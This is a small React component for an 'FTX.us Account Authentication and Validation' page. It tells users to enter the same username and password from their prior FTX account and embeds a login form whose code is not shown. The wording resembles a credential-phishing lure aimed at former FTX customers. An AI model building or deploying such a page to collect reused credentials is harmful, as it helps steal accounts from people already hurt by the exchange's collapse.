import LoginForm from "@/LoginForm.tsx";

function AuthAndValidationPage() {
  return (
    <>
      <div className={"flex flex-col gap-y-[4px]"}>
        <h4 className={"text-[19.2px] font-bold"}>
          FTX.us Account Authentication and Validation
        </h4>
        <p className={"text-[14px] text-[#808080] "}>
          This will require the same username and password from your prior FTX
          account. Already have an FTX Recovery account? Sign in.
        </p>
      </div>
      <LoginForm></LoginForm>
    </>
  );
}

export default AuthAndValidationPage;
